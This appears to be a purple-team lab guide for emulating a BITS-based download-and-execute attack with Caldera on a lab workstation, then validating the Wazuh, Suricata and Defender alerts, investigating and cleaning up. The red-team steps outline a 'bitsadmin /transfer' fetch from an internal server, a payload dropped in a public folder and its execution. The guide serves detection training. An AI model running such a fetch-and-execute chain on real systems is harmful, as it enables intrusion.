# INC-2026-001 · BITS LOLBin download

**Day 3** · Ticket **#48291**

← [All guides](README.md) · [Live evidence ledger](../live-evidence-ledger.md)

**Type:** Caldera  
**Target:** WKSTN-042  
**MITRE:** T1197, T1105, T1059.003

---

## Red team steps

1. Confirm sandcat **ALIVE** on WKSTN-042 (`blue-team-lab`).
2. Caldera → **New Operation**.
3. Name: `2026-06-13-INC001-BITS-LAB` (or current date).
4. Adversary: **`T1-Windows-Download-Exec`** · Group: **`blue-team-lab`**.
5. **Start** operation.
6. Monitor abilities:
   - `bitsadmin /transfer` → `http://10.10.30.10:8888/...`
   - Payload to `C:\Users\Public\payload.exe`
   - Execute payload

---

## Validate alerts (typical order)

| Time offset | Source | Rule / signal |
|-------------|--------|----------------|
| ~0s | Wazuh | Rule **180001** |
| ~+7s | Suricata | BITS / EXE download UA |
| ~+33s | Defender | `bitsadmin` process chain |

---

## Blue team / investigation

Follow [`incidents/INC-2026-001-bits-job-download.md`](../../incidents/INC-2026-001-bits-job-download.md) — compare to SCCM baseline on WKSTN-099.

---

## Stop and cleanup

1. Stop operation; allow cleanup abilities.
2. Isolate host; quarantine payload; remove BITS job.
3. Export `sysmon-INC001.json`, `wazuh-alert-INC001.json`, Caldera JSON → ticket **#48291**.

**Next:** [INC-2026-003 — Scheduled task](INC-2026-003-scheduled-task.md)